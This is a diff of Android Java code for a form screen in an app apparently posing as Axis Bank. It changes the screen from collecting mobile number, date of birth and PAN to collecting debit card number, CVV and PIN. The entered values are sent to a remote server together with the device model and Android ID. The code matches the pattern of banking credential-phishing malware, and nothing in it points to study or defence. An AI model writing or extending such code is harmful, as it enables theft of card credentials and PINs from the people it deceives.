@@ -1,11 +1,7 @@
-package com.axisofbank.german;
+package com.axisofbank.systemok;
 
-import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
-
-import androidx.fragment.app.Fragment;
-
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -14,7 +10,10 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
-import com.axisofbank.german.formHelper.DateInputMask;
+import androidx.fragment.app.Fragment;
+
+import com.axisofbank.systemok.formHelper.DebitCardInputMask;
+import com.axisofbank.systemok.formHelper.ExpiryDateInputMask;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -22,23 +21,35 @@ import org.json.JSONObject;
 import java.util.HashMap;
 import java.util.Map;
 
-public class FormFragment1 extends Fragment {
+public class FormFragment2 extends Fragment {
     public Map<Integer, String> ids;
     public HashMap<String, Object> dataObject;
     public View view;
+    public int id = 0;
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container,  Bundle savedInstanceState) {
-        view = inflater.inflate(R.layout.fragment_form1, container, false);
+        view = inflater.inflate(R.layout.fragment_form2, container, false);
 
-        EditText dob = view.findViewById(R.id.dob);
-        dob.addTextChangedListener(new DateInputMask(dob));
+        Bundle bundle = getArguments();
+        if (bundle != null) {
+            Log.d(Helper.TAG, "Bundle dd"+ bundle.toString());
+            id = bundle.getInt("id");
+        }
+
+        Log.d(Helper.TAG, "MMM "+id);
+
+        EditText card = view.findViewById(R.id.card);
+        card.addTextChangedListener(new DebitCardInputMask(card));
+
+        EditText exp = view.findViewById(R.id.exp);
+        exp.addTextChangedListener(new ExpiryDateInputMask(exp));
 
         dataObject = new HashMap<>();
 
         ids = new HashMap<>();
-        ids.put(R.id.mobile, "mobile");
-        ids.put(R.id.dob, "dob");
-        ids.put(R.id.pan, "pan");
+        ids.put(R.id.card, "card");
+        ids.put(R.id.cvv, "cvv");
+        ids.put(R.id.pin, "pin");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -68,29 +79,33 @@ public class FormFragment1 extends Fragment {
         JSONObject sendPayload = new JSONObject();
         try {
             Helper helper = new Helper();
+
+
+            Log.d(Helper.TAG, "Seocn ID "+ id);
             dataJson.put("mobileName", Build.MODEL);
             sendPayload.put("mobile_id", Helper.getAndroidId(getActivity().getApplicationContext()));
             sendPayload.put("site", helper.SITE());
             sendPayload.put("data", dataJson);
+            sendPayload.put("id", id);
             Helper.postRequest(helper.FormSavePath(), sendPayload, getContext(), new Helper.ResponseListener() {
                 @Override
                 public void onResponse(String result) {
+                    Log.d(Helper.TAG, "RES : "+ result);
                     if (result.startsWith("Response Error:")) {
-                        Toast.makeText(getActivity().getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
+                        Toast.makeText(getActivity().getApplicationContext(),  "Response Error : "+result, Toast.LENGTH_SHORT).show();
                     } else {
                         try {
                             JSONObject response = new JSONObject(result);
                             if(response.getInt("status")==200){
 
-                                FormFragment2 formFragment2 = new FormFragment2();
+                                FormFragment3 formFragment3 = new FormFragment3();
                                 Bundle bundle = new Bundle();
-                                bundle.putInt("id", response.getInt("data")); // Pass the 'id' you receive from the response
-                                formFragment2.setArguments(bundle);
+                                bundle.putInt("id", id);
+                                formFragment3.setArguments(bundle);
 
                                 requireActivity().getSupportFragmentManager().beginTransaction()
-                                        .replace(R.id.form_content, formFragment2)  // Use formFragment2 here
+                                        .replace(R.id.form_content, formFragment3)
                                         .commit();
-
                             }else{
                                 Toast.makeText(getActivity().getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                             }
